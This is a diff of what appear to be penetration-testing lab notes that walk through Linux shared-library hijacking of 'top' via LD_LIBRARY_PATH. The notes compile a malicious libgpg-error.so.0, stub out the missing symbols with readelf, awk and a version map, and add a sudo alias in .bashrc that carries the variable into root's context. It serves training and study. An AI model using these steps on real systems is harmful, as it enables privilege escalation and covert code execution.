@@ -113,7 +113,7 @@ Let's wal though an example with up command in linux.
 offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o lib.o lib.c
 offsec@linuxvictim:~/ldlib$ gcc -shared -o lib.so lib.o
 ```
-- 3. We use **ldd** command against top program to understand which libraries are being loaded when top executes.
+- 3.We use **ldd** command against top program to understand which libraries are being loaded when top executes.
 ```
 offsec@linuxvictim:~$ ldd /usr/bin/top
 linux-vdso.so.1 (0x00007ffd135c5000)
@@ -124,12 +124,12 @@ libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000
 Okay,libgpg-error.so.0 looks intersting, This is likely
 to be loaded by the application but not likely to be called unless the program encounters an error therefore this shouldn’t prevent normal use of the application. Let’s try to hijack.
 
-- 4. We rename .so file to match the one we’re hijacking and set the environment variable for LD_LIBRARY_PATH
+- 4.We rename .so file to match the one we’re hijacking and set the environment variable for LD_LIBRARY_PATH
 ```
 offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/
 offsec@linuxvictim:~/ldlib$ cp lib.so libgpg-error.so.
 ```
-- 5. Execute the top program and we identify symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined.
+- 5.Execute the top program and we identify symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined.
 ```
 offsec@linuxvictim:~/ldlib$ top
 top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required
@@ -137,7 +137,7 @@ by /lib/x86_64-linux-gnu/libgcrypt.so.20)
 top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock
 version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
 ```
-- 6. this means that certain variables or functions that the program expects to find when loading the original library have not been defined in our malicious library. we can simply define some variables with the same names that it expects and top should run. We will examine the libgpg-error.so.0  to detemine what symbols it contains using the **readelf** The error message tell use to look for **GPG_ERROR_1.0.**
+- 6.This means that certain variables or functions that the program expects to find when loading the original library have not been defined in our malicious library. we can simply define some variables with the same names that it expects and top should run. We will examine the libgpg-error.so.0  to detemine what symbols it contains using the **readelf** The error message tell use to look for **GPG_ERROR_1.0.**
 
 -s flag for symblos, --wide flag to force the untruncated names of the symbols, awk to pring 8th filed and append int in front of the resutlt, sed command to replace version
 information with a semicolon in order to finalize the variable definitions
@@ -149,4 +149,44 @@ int gpgrt_feof_unlocked;
 ...
 int gpgrt_fflush;
 int gpgrt_poll;
+```
+- 7.Modify our [lib.c](/08PlayingWithLinux/lib2.c) code to include a list of variable definitions, recompile and run.
+```
+offsec@linuxvictim:~/ldlib$ top
+top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required
+by /lib/x86_64-linux-gnu/libgcrypt.so.20)
+DLL HIJACKING IN PROGRESS
+```
+- 8.We got the working injection message, however, there is a error mesaage about shared library's version information. Not all supporting libraries require version information, so this does not always occur. We can slove this with [map file](https://www.gnu.org/software/gnulib/manual/html_node/LD-Version-Scripts.html) that identifies particular symbols as being associated with a given version of the library.
+
+```
+offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0
+| grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
+gpgrt_onclose;
+_gpgrt_putc_overflow;
+gpgrt_feof_unlocked;
+gpgrt_vbsprintf;
+```
+
+Copy the output symbols names to a anything.map file. see example format below
+
+```
+GPG_ERROR_1.0 {
+gpgrt_onclose;
+_gpgrt_putc_overflow;
+...
+gpgrt_fflush;
+gpgrt_poll;
+};
+```
+- 9.Recompile the code with map file and set LD_LIBRARY_PATH environment variable
+```
+offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o lib.o lib.c
+offsec@linuxvictim:~/ldlib$ gcc -shared -Wl,--version-script gpg.map -o libgpgerror.so.0 lib.o
+offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/
+```
+- 10.Hint, if you did't get a root output file,it is because a user’s environment variables aren’t normally passed to a sudo context. To get around this, we created an alias for sudo in the user’s .bashrc file
+```
+alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
+source ~/.bashrc
 ```
